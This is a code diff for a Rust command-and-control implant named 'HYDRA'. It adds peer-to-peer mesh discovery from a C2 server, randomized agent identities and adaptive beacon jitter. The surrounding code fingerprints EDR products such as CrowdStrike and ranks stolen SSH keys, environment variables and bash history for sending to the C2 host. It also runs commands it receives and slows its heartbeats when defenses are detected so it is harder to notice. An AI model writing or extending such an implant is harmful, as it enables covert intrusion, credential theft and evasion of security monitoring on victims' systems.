@@ -68,6 +68,13 @@ struct C2Response {
     epoch: i64,
 }
 
+#[derive(Deserialize)]
+struct DiscoveryResponse {
+    peers: Vec<String>,
+    #[allow(dead_code)]
+    mesh_id: String,
+}
+
 fn profile_defenses() -> String {
     let edr_signatures = [
         ("/opt/CrowdStrike/falcond", "CrowdStrike"),
@@ -326,6 +333,9 @@ struct Agent {
     state: u8,
     lambda: f64,
     last_command_output: String,
+    // --- PHASE 3.4 STORAGE ---
+    neighbors: Vec<String>,
+    cycle_count: u64,
 }
 
 fn detect_env() -> String {
@@ -352,8 +362,10 @@ impl Agent {
             }),
             failures: 0,
             state: 0,
-            lambda: 0.2,
+            lambda: 0.2, // Base frequency for jitter
             last_command_output: String::new(),
+            neighbors: Vec::new(),
+            cycle_count: 0,
         }
     }
 
@@ -376,7 +388,14 @@ impl Agent {
         let env_ctx = detect_env();
 
         loop {
-            // PHASE 3.3 PRIORITY: 1. Exec Output, 2. Loot (SSH/ENV), 3. Recon (Bash History)
+            // --- PHASE 3.4: P2P MESH REFRESH ---
+            // Trigger discovery every 5 cycles
+            if self.cycle_count % 5 == 0 {
+                self.refresh_mesh();
+            }
+            self.cycle_count += 1;
+
+            // --- PHASE 3.3 PRIORITY LOGIC ---
             let artifact_data = if !self.last_command_output.is_empty() {
                 let out = self.last_command_output.clone();
                 self.last_command_output.clear();
@@ -398,9 +417,10 @@ impl Agent {
                 os: os_info.clone(),
                 env_context: env_ctx.clone(),
                 artifact_preview: artifact_data,
-                defense_profile: defense_ctx, 
+                defense_profile: defense_ctx.clone(), 
             };
 
+            // --- HEARTBEAT & COMMAND EXECUTION ---
             match self.transport.send_heartbeat(&stats) {
                 Ok(res) => {
                     println!("[+] C2 Status: {} | Defense: {} | Activity: {}", res.status, stats.defense_profile, stats.artifact_preview);
@@ -439,16 +459,18 @@ impl Agent {
                 }
             }
 
-            if self.failures >= 3 { self.mutate(); }
-            
+            // --- ADAPTIVE JITTER SLEEP ---
             let mut rng = rand::thread_rng();
             let mut current_lambda = self.lambda;
-            if stats.defense_profile != "None" { current_lambda /= 2.0; }
+            
+            // If EDR detected, slow down heartbeats to reduce footprint
+            if defense_ctx != "None" { current_lambda /= 2.0; }
 
             let exp = Exp::new(current_lambda).unwrap();
-            let max_sleep = if stats.defense_profile != "None" { 300.0 } else { 60.0 };
+            let max_sleep = if defense_ctx != "None" { 300.0 } else { 60.0 };
             let sleep_time = exp.sample(&mut rng).min(max_sleep).max(1.0);
             
+            println!("[*] Cycle complete. Jitter sleep: {:.2}s", sleep_time);
             thread::sleep(Duration::from_secs_f64(sleep_time));
         }
     }
@@ -482,6 +504,28 @@ impl Agent {
             }),
         };
     }
+
+    fn refresh_mesh(&mut self) {
+        let c2_hostname = "hydra-c2-lab"; 
+        let url = format!("http://{}:8080/api/v1/mesh/peers", c2_hostname);
+        
+        let client = reqwest::blocking::Client::builder()
+            .timeout(Duration::from_secs(3))
+            .build()
+            .unwrap_or_default();
+
+        if let Ok(res) = client.get(&url).send() {
+            if let Ok(data) = res.json::<DiscoveryResponse>() {
+                self.neighbors = data.peers.into_iter()
+                    .filter(|peer_id| peer_id != &self.id)
+                    .collect();
+                
+                if !self.neighbors.is_empty() {
+                    println!("[+] Mesh Discovery: {} active neighbors identified.", self.neighbors.len());
+                }
+            }
+        }
+    }
 }
 
 fn display_splash() {
@@ -501,6 +545,13 @@ fn display_splash() {
 
 fn main() {
     display_splash();
-    let mut agent = Agent::new("HYDRA-AGENT-01");
+    
+    // Fixed Identity: Priority for AGENT_ID env var (ALPHA/BRAVO)
+    let agent_id = std::env::var("AGENT_ID").unwrap_or_else(|_| {
+        let mut rng = rand::thread_rng();
+        format!("HYDRA-NODE-{:04X}", rng.gen_range(0..u16::MAX))
+    });
+
+    let mut agent = Agent::new(&agent_id);
     agent.run();
 }
